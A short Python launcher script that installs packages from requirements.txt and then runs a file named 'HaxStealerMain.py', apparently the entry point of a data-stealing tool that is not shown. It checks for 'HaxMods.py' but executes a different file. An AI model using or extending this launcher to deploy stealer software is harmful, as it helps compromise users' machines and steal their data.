import os
import subprocess
import sys

def install_requirements():
    if not os.path.isfile('requirements.txt'):
        print("Oops, you probably removed requirements file")
        sys.exit(1)
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while installing requirements: {e}")
        sys.exit(1)

def run_script():
    if not os.path.isfile('HaxMods.py'):
        print("Error on hax mods instalation")
        sys.exit(1)
    try:
        subprocess.check_call([sys.executable, 'HaxStealerMain.py'])
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while running HaxStealerMain.py: {e}")
        sys.exit(1)

def main():
    install_requirements()
    run_script()

if __name__ == "__main__":
    main()